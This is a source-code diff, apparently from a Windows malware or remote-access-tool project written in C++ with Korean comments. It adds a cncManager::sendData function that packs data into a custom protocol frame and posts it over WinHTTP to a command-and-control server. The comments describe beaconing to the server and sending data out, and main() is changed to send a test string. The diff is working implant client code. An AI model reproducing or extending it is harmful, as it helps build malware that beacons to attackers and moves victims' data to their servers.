@@ -32,7 +32,7 @@ cncManager::~cncManager() {
     if (this->hSession) WinHttpCloseHandle(this->hSession);
 }
 
-
+/* C&C에 http request를 보내는 함수. send후 response parsing을 호출함. */
 void cncManager::sendHttpRequest(LPVOID data, DWORD dlen) {
     DWORD dwSize = 0;
     DWORD dwDownloaded = 0;
@@ -87,7 +87,29 @@ void cncManager::sendHttpRequest(LPVOID data, DWORD dlen) {
         } while (dwSize > 0);
     }
 }   
- 
+/* C&C에 데이터 보내는 함수. sendHttpRequest를 Wrapping함. */
+void cncManager::sendData(UCHAR DDtype, DWORD dlen, LPVOID data) {
+    if (dlen <= 0xffff) {
+        DDprotocol* ftpFrame = new DDprotocol;
+        ftpFrame->type = DDtype;
+        ftpFrame->len = dlen;
+        ftpFrame->seq = 0;
+
+        UCHAR* stream = new UCHAR[sizeof(DDprotocol) + dlen];
+        memset(stream, 0, sizeof(DDprotocol) + dlen);
+        memcpy(stream, ftpFrame, sizeof(DDprotocol));
+        memcpy(stream + sizeof(DDprotocol), data, dlen);
+
+        this->sendHttpRequest((LPVOID)stream, sizeof(DDprotocol) + dlen);
+        delete ftpFrame;
+        delete[] stream;
+        
+    }
+    /* 이쪽 seq로 잘라서 데이터 보내는거 구현해야함. */
+    //else
+}
+/* C&C에 beacon 보내는 함수. sendHttpRequest를 Wrapping함.*/
+/* 이 함수는 단일 스레드로 돌려야할듯. */
 void cncManager::sendBeacon() {
 	DDprotocol* beaconFrame = new DDprotocol;
 	beaconFrame->type = beaconRequest;
@@ -150,10 +172,10 @@ void cncManager::responseParser(UCHAR* res, DWORD len) {
 
 }
 
-
+/* For DEBUG */
 int main() {
 	cncManager client;
-	client.sendBeacon();
-    
-  
+    //client.sendBeacon();
+    const char* ptr = "JustForTestTestTest";
+    client.sendData(ftpResponse, strlen(ptr), (LPVOID)ptr);
 }
